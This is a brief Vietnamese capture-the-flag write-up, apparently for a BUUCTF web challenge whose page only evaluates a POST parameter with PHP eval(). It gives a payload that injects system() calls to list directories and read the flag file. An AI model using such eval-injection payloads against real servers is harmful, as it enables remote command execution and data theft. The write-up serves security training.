Challenge cho trang web sau, không có gì ngoài `eval($_POST["syc']`;

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/366adec8-bd44-49ce-ae80-5aa545f0bae9)

Theo gợi ý của challenge, Sẽ truyền tham số Syc theo method POST và được xử lý theo hàm eval(). Vậy tiến hành chèn lên tham số Syc. 

Payload: `Syc=system("cd ../../../;ls;cat flag");`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/4b5721e5-8471-4f67-a9c7-ee9fa48aef67)
